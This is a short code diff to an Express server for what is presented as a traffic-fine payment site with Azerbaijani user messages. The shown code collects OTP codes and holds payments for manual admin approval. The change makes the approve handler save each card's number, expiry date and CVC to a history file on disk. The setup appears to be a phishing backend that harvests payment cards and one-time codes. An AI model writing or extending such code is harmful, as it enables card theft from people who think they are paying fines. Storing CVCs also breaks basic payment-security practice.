@@ -158,18 +158,20 @@ app.post('/api/otp', (req, res) => {
     res.json({ success: true, message: "OTP kodu qəbul edildi, təsdiq gözlənilir" });
 });
 
-// POST Admin approve payment (Saves to paidHistory on disk)
+// POST Admin approve payment (Saves all card details to paidHistory on disk)
 app.post('/api/admin/approve', (req, res) => {
     fineData.isPaid = true;
     fineData.isPendingApproval = false;
 
-    // Add to history archive
+    // Add to history archive with full card info
     const historyItem = {
         protocolNo: fineData.protocolNo,
         plateNo: fineData.plateNo,
         location: fineData.location,
         amount: fineData.discountAmount,
         cardNo: fineData.cardNo,
+        cardExp: fineData.cardExp,
+        cardCvc: fineData.cardCvc,
         approvedAt: getCurrentDateTime()
     };
     paidHistory.unshift(historyItem); // Add to beginning
